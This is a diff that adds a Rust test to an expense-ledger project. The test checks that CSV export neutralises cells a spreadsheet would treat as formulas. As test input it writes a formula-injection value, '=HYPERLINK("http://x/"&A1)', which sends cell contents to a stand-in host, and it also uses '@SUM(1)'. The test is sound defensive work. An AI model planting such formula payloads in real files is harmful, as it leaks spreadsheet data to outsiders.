@@ -537,3 +537,34 @@ fn a_bill_before_the_first_rule_starts_can_be_divided_once_a_rule_is_proposed() 
     let (_, from, now) = view::proposal_target(&l, A, today);
     assert_eq!((from, now), (d("2026-12-01"), false));
 }
+
+#[test]
+fn a_spreadsheet_never_reads_peoples_words_as_formulas() {
+    let mut l = sk_view::demo::ledger(today());
+    // a category and a note someone typed that a spreadsheet would run
+    if let Some(e) = l
+        .entries
+        .values_mut()
+        .rev()
+        .find(|e| matches!(e.kind, sk_ledger::EntryKind::Expense { .. }) && !e.deleted)
+    {
+        if let sk_ledger::EntryKind::Expense { expense, .. } = &mut e.kind {
+            expense.category = "=HYPERLINK(\"http://x/\"&A1)".into();
+            expense.note = Some("@SUM(1)".into());
+        }
+    }
+    let first = NaiveDate::from_ymd_opt(2027, 3, 1).unwrap();
+    let (_, text) = view::csv(&l, A, first, None).unwrap();
+    for cell in text.lines().flat_map(|l| l.split(',')) {
+        let c = cell.trim_start_matches('"');
+        assert!(!c.starts_with(['=', '@', '+']), "{cell}");
+    }
+    assert!(
+        text.contains("'@SUM(1)") || text.contains("'=HYPERLINK"),
+        "{text}"
+    );
+    // amounts stay numbers, minus signs and all
+    assert!(text.lines().any(|l| l
+        .split(',')
+        .any(|c| c.starts_with('-') && c[1..].parse::<f64>().is_ok())));
+}
